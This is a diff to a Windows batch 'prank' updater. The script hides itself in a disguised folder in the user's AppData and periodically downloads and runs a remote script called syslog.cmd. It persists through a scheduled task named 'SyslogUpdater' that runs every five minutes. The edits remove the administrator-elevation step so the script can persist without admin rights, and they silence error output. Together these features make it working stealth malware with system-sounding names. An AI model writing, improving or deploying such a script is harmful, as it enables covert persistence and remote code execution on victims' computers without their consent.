@@ -4,14 +4,8 @@ setlocal enabledelayedexpansion
 :: ============================================================
 ::   UPDATER – checks for new prank version, runs syslog.cmd
 ::   Stores files in %LOCALAPPDATA%\.sysupdatecom (hidden)
+::   No administrator rights needed.
 :: ============================================================
-
-:: ---------- CHECK FOR ADMIN (required for schtasks) ----------
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs"
-    exit /b
-)
 
 :: ---------- CONFIGURATION ----------
 set "BASE=%LOCALAPPDATA%\.sysupdatecom"
@@ -26,12 +20,12 @@ set "MAX_RETRIES=3"
 
 :: Create hidden base folder
 if not exist "%BASE%" mkdir "%BASE%"
-attrib +h "%BASE%"
+attrib +h "%BASE%" >nul 2>&1
 
 :: Self‑install (copy updater to BASE)
 if /i not "%~f0"=="%UPDATER_SELF%" (
     copy /Y "%~f0" "%UPDATER_SELF%" >nul
-    attrib +h "%UPDATER_SELF%"
+    attrib +h "%UPDATER_SELF%" >nul 2>&1
 )
 
 :: ---------- FUNCTION: DOWNLOAD WITH RETRIES ----------
@@ -77,7 +71,7 @@ if exist "%REMOTE_VER%" (
         if exist "%TEMP%\syslog.cmd" (
             move /Y "%TEMP%\syslog.cmd" "%PRANK_FILE%" >nul
             echo !REMOTE! > "%LOCAL_VER%"
-            attrib +h "%PRANK_FILE%"
+            attrib +h "%PRANK_FILE%" >nul 2>&1
         ) else (
             echo Failed to download prank update.
         )
@@ -92,6 +86,6 @@ if exist "%PRANK_FILE%" (
 )
 
 :: ---------- ENSURE SCHEDULED TASK RUNS UPDATER EVERY 5 MINUTES ----------
-schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER_SELF%\"" /sc minute /mo 5 /ru SYSTEM /f >nul 2>&1
+schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER_SELF%\"" /sc minute /mo 5 /f >nul 2>&1
 
 endlocal
